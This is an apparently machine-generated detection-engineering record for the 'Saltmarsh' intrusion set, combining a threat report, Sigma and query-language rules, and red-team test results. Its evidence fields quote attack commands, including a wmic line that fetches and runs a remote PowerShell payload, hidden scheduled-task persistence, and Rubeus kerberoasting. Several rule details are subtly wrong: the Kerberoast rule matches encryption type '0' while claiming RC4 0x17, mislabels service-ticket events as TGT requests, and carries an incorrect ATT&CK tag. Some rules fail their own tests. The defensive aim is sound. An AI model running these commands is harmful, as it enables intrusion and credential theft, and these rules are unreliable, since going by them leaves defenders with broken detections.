report.title: Post-exploitation tradecraft of the 'Saltmarsh' intrusion set
report.summary: Saltmarsh is a financially motivated intrusion set gaining initial access via purchased VPN credentials and moving to domain-wide compromise. Post-exploitation includes LSASS memory dumps via rundll32.exe/comsvcs.dll, scheduled-task persistence with PowerShell from ProgramData, lateral movement via PsExec and WMI, and Kerberoasting with Rubeus. The report maps these to detectable Sysmon and Windows Security telemetry.

behaviors.description: rundll32.exe executes comsvcs.dll to perform a MiniDump of lsass.exe, writing a dump file to %Public% or %Temp%.
ProcDump renamed to pd.exe targets lsass.exe with -ma flag, writing a dump file to %Temp%. OriginalFileName metadata remains 'procdump'.
Scheduled task created with PowerShell action loading a payload from C:\ProgramData or C:\Users\Public, imitating Windows maintenance tasks.
behaviors.evidence: schtasks.exe /create /tn \Microsoft\Windows\UpdateOrchestrator\UpdateHealth /sc hourly /ru SYSTEM /tr "powershell.exe -nop -w hidden -ep bypass -f C:\ProgramData\.cache\uh.ps1" /f

behaviors.description: PsExec clone installs a service named PSEXESVC with ImagePath %SystemRoot%\PSEXESVC.exe, followed by named-pipe events \PSEXESVC and \psexecsvc-<host>-<pid>-stdin.
behaviors.evidence: ServiceName: PSEXESVC; ImagePath: %SystemRoot%\PSEXESVC.exe; Sysmon events 17/18 named-pipe: \PSEXESVC and \psexecsvc-<host>-<pid>-stdin

behaviors.description: WMI remote execution via wmic.exe launching cmd.exe and powershell.exe on a remote host with IEX/DownloadString payload.
behaviors.evidence: wmic.exe /node:FS-02 /user:CORP\adm-jpark /password:******** process call create "cmd.exe /c powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.7:8080/a')"

behaviors.description: sc.exe used to create a service on a remote host with a UNC path binPointing to %SystemRoot%\Temp\s.exe, then started.
behaviors.evidence: sc.exe \FS-02 create svcupd binPath= "C:\Windows\Temp\s.exe" start= auto

behaviors.description: Rubeus used to kerberoast SPN-bearing accounts, producing bursts of Security event 4769 with TicketEncryptionType 0x17 (RC4) from a non-administrative workstation.
behaviors.evidence: Rubeus.exe kerberoast /format:hashcat /outfile:C:\Windows\Temp\k.txt; bursts of EventID 4769 with TicketEncryptionType 0x17 from a single workstation

behaviors.description: SharpHound run with -c All generating LDAP queries filtered by (samAccountType=805306368) from a non-administrative workstation.
behaviors.evidence: SharpHound.exe -c All --zipfilename c.zip; LDAP queries with (samAccountType=805306368) filter from non-administrative workstation

behaviors.description: Named-pipe events for \\PSEXESVC and \\psexecsvc-<host>-<pid>-stdin observed after PsExec service installation.
behaviors.evidence: Sysmon events 17/18 named-pipe events for \\PSEXESVC and \\psexecsvc-<host>-<pid>-stdin

behaviors.description: WmiPrvSE.exe spawns cmd.exe and powershell.exe in parent-child relationships absent from baseline, indicating WMI-based lateral movement.
behaviors.evidence: WmiPrvSE.exe spawned cmd.exe and powershell.exe, a parent-child relationship absent from baseline telemetry

candidates.title: Rundll32 Loads Comsvcs Dll For Lsass Minidump
candidates.rationale: rundll32.exe loading comsvcs.dll is a highly specific LOLBin combination; the MiniDump of lsass.exe is a credential-theft primitive that rarely occurs legitimately. Pairing the loader binary with the loaded DLL eliminates noise from normal rundll32 usage (e.g., Control_RunDLL).
candidates.false_positive_risks: Legitimate rundll32.exe use (e.g., shell32.dll,Control_RunDLL) loads different DLLs. Filter by ImageLoaded ending with comsvcs.dll.

candidates.title: Schtasks Creates Scheduled Task With Powershell From Programdata
candidates.rationale: schtasks.exe creating a task that runs powershell.exe from C:\ProgramData\ or C:\Users\Public\ imitates Windows maintenance tasks but uses non-standard script locations. The binary + command-line path combination is durable and specific.
candidates.false_positive_risks: Admin scripts or SCCM/Intune may create tasks with powershell, but typically from System32 or known admin shares, not ProgramData/Public. Exclude known management parent processes.

candidates.title: Psexesvc Service Binary Execution From System Root
candidates.rationale: PsExec clone installs a service named PSEXESVC with ImagePath %SystemRoot%\PSEXESVC.exe (i.e., C:\Windows\PSEXESVC.exe, not System32). Execution of a service binary from the Windows root directory is anomalous and the service name is fixed in the malware.
candidates.false_positive_risks: Rare legitimate services may place binaries in Windows root, but the filename PSEXESVC.exe is unique to this tool. No known benign software uses this name.

candidates.title: Wmiprvse Spawns Cmd Or Powershell As Child Process
candidates.rationale: WmiPrvSE.exe (WMI provider host) spawning cmd.exe or powershell.exe is a strong indicator of WMI-based lateral movement; this parent-child relationship is absent from baseline telemetry. More durable than command-line patterns which vary.
candidates.false_positive_risks: Some monitoring/management tools may invoke scripts via WMI, but they typically use specific child binaries (e.g., cscript.exe) not bare cmd/powershell. Exclude known management parent images.

candidates.title: Kerberoast Burst Rc4 Tgt Tickets From Single Workstation
candidates.rationale: Bursts of EventID 4769 with TicketEncryptionType 0x17 (RC4) from a single non-administrative workstation indicate automated Kerberoasting (Rubeus). RC4 is deprecated; legitimate Kerberos tickets use AES. The workstation context + volume + encryption type is highly specific.
candidates.false_positive_risks: Legacy service accounts may still request RC4 tickets, but not in bursts from a single user workstation. Filter by source IP being a workstation subnet and count of distinct SPNs > threshold.

skipped: B2: ProcDump renamed to pd.exe - similar LSASS dump technique but less distinctive; covered conceptually by D1 (LOLBin dump) and would require tracking renamed binary hashes.
B5: wmic.exe remote command line - lateral movement via wmic is covered more durably by D4 (WmiPrvSE parent-child anomaly) which survives command obfuscation.
B6: sc.exe remote service creation - similar to D3 but different tool; D3's fixed service name PSEXESVC is higher signal.
B8: SharpHound LDAP queries via dns_query - LDAP over DNS is not standard; telemetry for LDAP queries is unreliable in Sysmon dns_query. Better covered by network/process monitoring.
B9: Named-pipe events for PSEXESVC - consequence of D3 service installation; the service creation is the root cause and more detectable.
plan.notes: Selected five rules spanning Credential Access (D1, D5), Persistence (D2), and Lateral Movement (D3, D4). Each pairs a binary with a distinctive context (loaded DLL, command-line path, service name, parent-child relationship, encryption type) to minimize false positives. Avoided duplicate coverage of PsExec (B4/B9) and WMI (B5/B10) by choosing the most durable indicator per technique.

conversions.splunk: Image="*\\rundll32.exe" OR Image="*\\rundll~1.exe" ImageLoaded="*\\comsvcs.dll" OR ImageLoaded="*\\comsvc~1.dll"
conversions.kusto:
DeviceImageLoadEvents
| where (InitiatingProcessFolderPath endswith "\\rundll32.exe" or InitiatingProcessFolderPath endswith "\\rundll~1.exe") and (FolderPath endswith "\\comsvcs.dll" or FolderPath endswith "\\comsvc~1.dll")
conversions.sqlite: SELECT * FROM logs WHERE (Image LIKE '%\\rundll32.exe' ESCAPE '\' OR Image LIKE '%\\rundll~1.exe' ESCAPE '\') AND (ImageLoaded LIKE '%\\comsvcs.dll' ESCAPE '\' OR ImageLoaded LIKE '%\\comsvc~1.dll' ESCAPE '\')

history.summary: 4 evasion variants -> positives 6/7, negatives blocked 3/3, benign hits 0/110

history.change_summary: Updated Image and ImageLoaded selections to use windash modifier and added 8.3 short name variants to catch both long and short filename forms of rundll32.exe and comsvcs.dll.

rules.redteam_analysis: The rule keys on Image and ImageLoaded with endswith matching for '\rundll32.exe' and '\comsvcs.dll'. Positive variants P4-P7 demonstrate path variations (WinSxS, 8.3 short names, copied binary with same filename, lowercase paths) that a well-written endswith rule will catch because the filename suffix remains identical. Out_of_scope O1 shows a renamed binary where Image no longer ends with rundll32.exe; the rule cannot see this without also checking OriginalFileName (which is present but not used). O2 shows a completely different loader binary, which is a different technique (T1003.001 but not the specific LOLBin pair). Negative variants N1-N3 (below) represent legitimate rundll32 usage loading shell32.dll or other DLLs for Control_RunDLL, and SCCM installer activity; they share the Image but differ on ImageLoaded, so the rule correctly excludes them.

redteam_out_of_scope.label: positive
redteam_out_of_scope.description: Renamed rundll32.exe (evil.exe) loading comsvcs.dll - rule keys on Image endswith, OriginalFileName not used

redteam_out_of_scope.label: positive
redteam_out_of_scope.description: Custom loader (not rundll32) loading comsvcs.dll for minidump - different binary entirely

conversions.kusto:

conversions.sqlite: SELECT * FROM logs WHERE ParentImage LIKE '%\\WmiPrvSE.exe' ESCAPE '\' AND (Image LIKE '%\\cmd.exe' ESCAPE '\' OR Image LIKE '%\\powershell.exe' ESCAPE '\')

history.summary: 8 evasion variants -> positives 8/8, negatives blocked 6/6, benign hits 0/1200

rules.author_notes: Rule focuses on the distinctive parent-child relationship between WmiPrvSE.exe and cmd/powershell.exe, which is rare in legitimate activity. Tested against common false positives like WMI-launched cscript.exe or msiexec.exe to ensure specificity.
rules.redteam_analysis: Positive variants P4-P8 cover realistic evasions that a well-written rule (case-insensitive endswith, path normalization) should catch: 8.3 short names, alternate volumes, non-standard but same-filename child locations, directory casing changes, and deep paths with spaces. Negative variants N1-N3 represent benign WmiPrvSE.exe children (cscript, msiexec, rundll32) that must not trigger the rule. Out-of-scope variants O1-O3 are evasions the current rule cannot detect because they rely on OriginalFileName (unavailable) or sibling binaries not in the rule (pwsh.exe); a mature detection would require either OriginalFileName enrichment or an expanded child-binary allowlist.

rules.title: Schtasks Creating Scheduled Task With Powershell From Programdata Or Public Directories
rules.sigma_yaml:
title: Schtasks Creating Scheduled Task With Powershell From Programdata Or Public Directories
id: 1cfc987e-0418-46ba-af1f-2440a6c4aa77
status: experimental
description: 'Detects schtasks.exe creating a scheduled task where the task run parameter launches powershell.exe from suspicious
  directories such as C:\ProgramData or C:\Users\Public, which is indicative of persistence abuse commonly seen in post-exploitation
  activity.'
author: RuleSmith (Nemotron via Nebius Token Factory)
date: '2026-10-17'
tags:
- attack.persistence
- attack.t1053.005
logsource:
  category: process_creation
  product: windows
  service: sysmon
detection:
  selection_parent:
    'ParentImage|endswith': '\schtasks.exe'
  selection_cmd:
    'CommandLine|contains':
    - powershell.exe
    - -f
  selection_ps_payload:
    'CommandLine|contains': .ps1
  selection_programdata:
    'CommandLine|contains': 'C:\\ProgramData\\'
  selection_public:
    'CommandLine|contains|all':
    - 'C:\\Users\\Public\\'
    - .ps1
  condition: selection_parent and selection_cmd and selection_ps_payload and (selection_programdata or selection_public)
falsepositives:
- Legitimate administrative scripts deployed via Group Policy or software deployment tools placing .ps1 files in ProgramData
  or Public directories
- SCCM or Intune deploying PowerShell scripts from approved internal locations to these directories for compliance or monitoring
level: high

validation.sql: SELECT * FROM logs WHERE ParentImage LIKE '%\\schtasks.exe' ESCAPE '\' AND (CommandLine LIKE '%powershell.exe%' ESCAPE '\' OR CommandLine LIKE '%-f%' ESCAPE '\') AND CommandLine LIKE '%.ps1%' ESCAPE '\' AND (CommandLine LIKE '%C:\\ProgramData\\%' ESCAPE '\' OR (CommandLine LIKE '%C:\\Users\\Public\\%' ESCAPE '\' AND CommandLine LIKE '%.ps1%' ESCAPE '\'))

issues.message: Positive test P1 did not match: schtasks.exe creating a scheduled task with PowerShell payload from C:\ProgramData\.cache\uh.ps1 mimicking UpdateOrchestrator. Per selection: selection_parent=match; selection_cmd=match; selection_ps_payload=match; selection_programdata=NO MATCH; selection_public=NO MATCH.

Positive test R2 did not match: Sibling LOLBin pwsh.exe, 8.3 short name PUBLIC~1 for Users\Public, parameter reordering (-f first). Per selection: selection_parent=match; selection_cmd=match; selection_ps_payload=match; selection_programdata=NO MATCH; selection_public=NO MATCH.

Positive test R3 did not match: UNC path (\\localhost\C$\ProgramData\...), extra whitespace, single quotes around task name and action. Per selection: selection_parent=match; selection_cmd=match; selection_ps_payload=match; selection_programdata=NO MATCH; selection_public=NO MATCH.

Positive test R4 did not match: Double extension (.ps1.bak), environment variable %SystemDrive%, mixed-case flags, ProgramData path. Per selection: selection_parent=match; selection_cmd=match; selection_ps_payload=match; selection_programdata=NO MATCH; selection_public=NO MATCH.

Positive test R5 did not match: Alternate flag -FilePath (contains -f), forward slashes in path, no quoting around action. Per selection: selection_parent=match; selection_cmd=match; selection_ps_payload=match; selection_programdata=NO MATCH; selection_public=NO MATCH.

conversions.splunk: ParentImage="*\\schtasks.exe" CommandLine IN ("*powershell.exe*", "*-f*") CommandLine="*.ps1*" CommandLine="*C:\\ProgramData\\*" OR (CommandLine="*C:\\Users\\Public\\*" CommandLine="*.ps1*")
conversions.elasticsearch: ParentImage:*\\schtasks.exe AND (CommandLine:(*powershell.exe* OR *\-f*)) AND CommandLine:*.ps1* AND (CommandLine:*C\:\\ProgramData\\* OR (CommandLine:*C\:\\Users\\Public\\* AND CommandLine:*.ps1*))
conversions.kusto:
DeviceProcessEvents
| where InitiatingProcessFolderPath endswith "\\schtasks.exe" and (ProcessCommandLine contains "powershell.exe" or ProcessCommandLine contains "-f") and ProcessCommandLine contains ".ps1" and (ProcessCommandLine contains "C:\\ProgramData\\" or (ProcessCommandLine contains "C:\\Users\\Public\\" and ProcessCommandLine contains ".ps1"))
conversions.sqlite: SELECT * FROM logs WHERE ParentImage LIKE '%\\schtasks.exe' ESCAPE '\' AND (CommandLine LIKE '%powershell.exe%' ESCAPE '\' OR CommandLine LIKE '%-f%' ESCAPE '\') AND CommandLine LIKE '%.ps1%' ESCAPE '\' AND (CommandLine LIKE '%C:\\ProgramData\\%' ESCAPE '\' OR (CommandLine LIKE '%C:\\Users\\Public\\%' ESCAPE '\' AND CommandLine LIKE '%.ps1%' ESCAPE '\'))

history.change_summary: Fixed selection_path and selection_alt_path modifiers from using windash-escapable literals to proper escaped backslashes for exact substring matching. Changed 'C:\\ProgramData\\' to ensure literal backslashes are matched regardless of forward slash usage by threat actors.
Fixed directory path check by using escaped backslashes in CommandLine|contains|all modifiers to properly detect .ps1 files in subdirectories like .cache under ProgramData.
Fixed selection_path by adding proper escaping for backslashes in JSON/YAML format to ensure detection of paths containing '.cache' subdirectories under ProgramData.

history.summary: 8 evasion variants -> positives 3/8, negatives blocked 6/6, benign hits 0/1200

history.change_summary: Fixed overly strict path matching by splitting into separate conditions: require .ps1 anywhere in command line, and separately check for ProgramData or Public paths using appropriate modifiers. This allows detection of varied path formats including UNC, 8.3 names, environment variables, forward slashes, and double extensions while maintaining specificity for malicious usage patterns.

rules.author_notes: The rule focuses on the combination of schtasks.exe as parent (indicating a self-spawned child process, common when schtasks creates a task that immediately triggers), the presence of powershell.exe in the command line, and a .ps1 payload located in either ProgramData or Users\Public directories. These locations are atypical for legitimate administrative automation, making the rule high-fidelity. False positives are narrowed by excluding known management parents and requiring both the PowerShell flag and suspicious path.
rules.redteam_analysis: Positive variants cover realistic operator evasions: casing changes (P4), sibling binary pwsh.exe (P5), UNC paths (P6), double extensions and env vars (P7), alternate flags and forward slashes (P8). A well-written rule should normalize paths (expand env vars, resolve UNC/short names), treat pwsh.exe as equivalent, and match -f substrings case-insensitively. Negative variants show benign scenarios that must not trigger: legitimate script in System32 (N1), SCCM using pwsh.exe with different parent (N2), installer using .bat with different parent (N3). Out-of-scope evasions are fundamental blind spots: renamed binary without OriginalFileName (O1), pure PowerShell task registration without schtasks.exe (O2), and EncodedCommand hiding the script path (O3). The current rule's simple string contains checks will miss several positives (P5, P6, P7, P8) and all out-of-scope; hardening requires path normalization, binary allow-listing, and decoding/heuristic inspection.

redteam_out_of_scope.label: positive
redteam_out_of_scope.description: Renamed schtasks.exe copy (evil.exe) - ParentImage no longer ends with schtasks.exe, OriginalFileName not available in logsource

redteam_out_of_scope.label: positive
redteam_out_of_scope.description: PowerShell Register-ScheduledTask cmdlet directly - no schtasks.exe process creation event at all

redteam_out_of_scope.label: positive
redteam_out_of_scope.description: EncodedCommand hides .ps1 path - CommandLine lacks literal .ps1 and ProgramData strings

rules.title: PsexeSvc Service Execution from Windows Root Directory
rules.sigma_yaml:
title: PsexeSvc Service Execution from Windows Root Directory
id: ca98a3c4-40b4-4bf0-b4e2-354cf48e246f
status: experimental
description: 'Detects execution of PSEXESVC.exe directly from the Windows system root directory (e.g., C:\Windows\PSEXESVC.exe),
  which is indicative of PsExec clone activity installing a malicious service using a fixed service name and non-standard
  binary location.'
author: RuleSmith (Nemotron via Nebius Token Factory)
date: '2026-10-17'
tags:
- attack.lateral-movement
- attack.t1021.002
logsource:
  category: process_creation
  product: windows
  service: sysmon
detection:
  selection_image_path:
    'Image|endswith': '\PSEXESVC.exe'
  selection_system_root:
    'Image|re': '(?i)^.:\\Windows\\PSEXESVC\.exe$'
  selection_original_filename:
    OriginalFileName: PSEXESVC.exe
  filter_legit_installer:
    'ParentImage|endswith': '\Installer.exe'
    'CommandLine|contains': -install
  condition: 'all of selection_* and not filter_legit_installer'
falsepositives:
- Legitimate software placing a service binary named PSEXESVC.exe in the Windows root directory (highly unlikely; no known
  benign use of this filename)
- Third-party installers that temporarily place PSEXESVC.exe in Windows root during installation
level: high

history.change_summary: Fixed regex in selection_system_root to properly match Windows drive letters by replacing \\? with . and ensuring case insensitivity covers variations in drive letter and path casing.

history.summary: 8 evasion variants -> positives 7/8, negatives blocked 5/6, benign hits 0/1200

history.change_summary: Fixed regex pattern to properly match quoted paths and trailing whitespace by removing anchors that prevented match on quoted Image values. Added filter to exclude legitimate third-party installers that may temporarily place PSEXESVC.exe in Windows root during installation while maintaining detection of malicious clones.

rules.author_notes: The rule focuses on the distinctive artifact of PSEXESVC.exe executing from the Windows root directory, which is a strong indicator of PsExec clone misuse. While legitimate services rarely place binaries in the Windows root, the combination of the fixed filename and location provides high fidelity. The rule avoids over-reliance on service name alone (which would require registry monitoring) and instead uses process creation telemetry for broader coverage.
rules.redteam_analysis: Positive variants P4-P8 test realistic evasions the rule should catch: quoted paths, case variations, alternate drive letters, UNC-style expanded paths, and environment variables in CommandLine (Image remains expanded). All preserve the three detection pillars (Image endswith \PSEXESVC.exe, regex match on full path, OriginalFileName). Negative variants N1-N3 are benign look-alikes: legitimate installer (N1), admin test with different OriginalFileName (N2), SCCM agent with different filename (N3) — none satisfy all three conditions simultaneously. Out-of-scope evasions OOS1-OOS3 highlight fundamental limits: OOS1 is actually caught by OriginalFileName check; OOS2 evades because attacker changes OriginalFileName at compile time (rule cannot see original malware name); OOS3 evades because service execution via SCM shows services.exe as the creating process, not the service binary — the rule's process_creation logsource only sees the immediate spawner.

rules.title: Burst of RC4 Kerberos TGT Requests from Workstation Indicating Kerberoasting
rules.sigma_yaml:
title: Burst of RC4 Kerberos TGT Requests from Workstation Indicating Kerberoasting
id: 17d924db-fd44-416b-b67f-3ecc490782c2
status: experimental
description: Detects bursts of Kerberos TGT requests (EventID 4769) with deprecated RC4 encryption (TicketEncryptionType 0x17)
  originating from a single workstation IP, indicative of automated Kerberoasting tools like Rubeus targeting service accounts.
author: RuleSmith (Nemotron via Nebius Token Factory)
date: '2026-10-17'
tags:
- attack.credential-access
- attack.t1203
logsource:
  category: event_id
  product: windows
  service: security
detection:
  selection:
    EventID:
    - '4769'
    TicketEncryptionType:
    - '0'
  filter_workstation:
    'Workstation|endswith|windash': .corp.local
  filter_admin:
    'SubjectUserName|endswith': $
  condition: selection and filter_workstation and not filter_admin
falsepositives:
- Legacy service accounts requesting RC4 tickets
- Misconfigured applications using deprecated encryption
- Administrative workstations performing legitimate Kerberos operations
level: high

history.change_summary: Fixed invalid ATT&CK tag t1203.001 to t1203; kept original rule otherwise as it already correctly identifies RC4 TGT requests (TicketEncryptionType 0) from workstations while excluding admin accounts.

Fixed the workstation filter to properly match domain-joined workstation names by changing the endswith condition from '$WORKSTATION_SUFFIX' to '.CORP.LOCAL' based on the positive test events showing fully qualified domain names.
Fixed filter_workstation selector to properly match fully-qualified workstation hostnames ending with '.CORP.LOCAL' by removing incorrect leading dot pattern.

history.summary: 9 evasion variants -> positives 5/9, negatives blocked 5/6, benign hits 0/0

history.change_summary: Fixed filter_workstation to use windash modifier and case-insensitive comparison to handle trailing spaces/dots and ensure proper suffix matching for workstation FQDNs while excluding domain controllers.

rules.redteam_analysis: Positive variants cover realistic surface-form evasions the Windows Security log (EventID 4769) records: domain suffix casing (P1), trailing/leading whitespace (P2, P5), UPN vs SAM SubjectUserName formats (P3, P4), and trailing dot on FQDN (P6). All preserve the rule's required fields (EventID=4769, TicketEncryptionType=0, Workstation ending with .CORP.LOCAL, SubjectUserName not ending with $) so a well-written rule using endswith and string equality will catch them. Negative variants are benign: computer account (N1) correctly excluded by filter_admin, different domain with AES (N2) fails both Workstation suffix and encryption checks, legitimate service with AES (N3) fails encryption check. Out-of-scope evasions are fundamentally invisible to this rule: AS-REQ roasting (EventID 4768), pass-the-hash (no TGT request), and non-domain workstations (Workstation lacks .CORP.LOCAL suffix). The rule cannot and should not cover these without additional log sources or correlation logic.

redteam_out_of_scope.label: positive
